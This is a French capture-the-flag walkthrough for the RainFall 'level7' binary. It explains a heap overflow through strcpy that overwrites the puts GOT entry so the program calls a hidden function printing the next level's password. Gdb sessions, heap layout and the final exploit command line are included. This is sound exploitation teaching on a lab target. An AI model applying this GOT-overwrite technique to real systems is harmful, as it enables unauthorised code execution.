# Level7

### **Déroulement du programme :** ###

###### main()
- 4 buffers sont alloués sur la heap (disons `buff_1`, `buff_2`, `buff_3` et `buff_4`)
    * l'adresse de `buff_2` est assigné à `buff_1[1]`
    * l'adresse de `buff_4` est assigné à `buff_3[1]`
- copie d'`argv[1]` à l'adresse contenu dans `buff_1[1]`
- copie d'`argv[2]` à l'adresse contenu dans `buff_3[1]`
- le fichier **"/home/user/level8/.pass"** est `fopen`
- le contenu de ce fichier est assigné à une variable globale, `c`
- **"~~"** est `puts` sur la sortie standard

###### m()
- imprime le contenu de `c` sur la sortie standard 

### **Réflexion :** ###

`m` n'étant jamais appelée dans le `main` il va falloir trouver un moyen de l'exécuter après que le contenu de **.pass** ait été copié dans `c`.

Les buffers ayant été alloués sur la **heap** il ne nous est pas possible de surcharger la sauvegarde de l'**EIP** présente dans la **stack frame** du `main`, on va donc employer un **heap overflow** grâce aux `strcpy`.


### **Tests :** ###

```
(gdb) b *0x080485a5
# juste après le premier strcpy
Breakpoint 1 at 0x80485a5
(gdb) b *0x080485c2
# juste après le second strcpy
Breakpoint 2 at 0x80485c2
(gdb) r $(python -c 'print("A"*100)') $(python -c 'print("B"*100)')
Starting program: /home/user/level7/level7 $(python -c 'print("A"*100)') $(python -c 'print("B"*100)')

Breakpoint 1, 0x080485a5 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8b59 in ?? () from /lib/i386-linux-gnu/libc.so.6
```

On peut voir ici que le programme plante juste après le premier `strcpy`, on peut en déduire qu'on a écrasé l'adresse contenu dans `buff_3[1]`.

En cherchant un peu on se rend compte que le programme **segfault** quand `argv[1]` excède une taille de 20.

Pour expliquer cela il faut savoir que :
* nos buffers sont placés de manière contigus sur la heap
* `buff_1[1]` contient l'adresse de `buff_2`
* `buff_3[1]` contient l'adresse de `buff_4`
* nos buffers prennent en réalité 16 octets chacun

```
level7@RainFall:~$ ltrace ./level7
__libc_start_main(0x8048521, 1, 0xbffff7b4, 0x8048610, 0x8048680 <unfinished ...>
malloc(8)                                                                = 0x0804a008
malloc(8)                                                                = 0x0804a018
malloc(8)                                                                = 0x0804a028
malloc(8)                                                                = 0x0804a038
```

Notre heap est donc ainsi :

```
[8 octets alloués][4 octets de métadonnées][ 4 octets pour l'adresse ] # buff_x

[.&b2......][m][&] # buff_1
                 [........][m][&] # buff_2
                                [.&b4......]|[m][&] # buff_3
                                                  [........][m][&] # buff_4
```

C'est pourquoi on se retrouve à réécrire l'adresse contenu dans `buff_3[1]` avec un offset de 20 .

Le seul endroit où l'on peut faire un appel à `m` après que le contenu du **.pass** ait été copié dans `c` est au moment où on va faire appel à `puts`.


### **Solution :** ###

Grâce au premier `strcpy` on va remplacer l'adresse contenu dans `buff_3[1]` par l'adresse qui contient l'adresse où `puts@plt` va jump.

```
(gdb) disas 'puts@plt'
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928 # celle là
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```

Pour finir, on va remplacer le contenu de cette adresse par l'adresse de `m` grâce au second `strcpy`.

```
(gdb) x m
0x80484f4 <m>:	0x83e58955
```

`./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')`

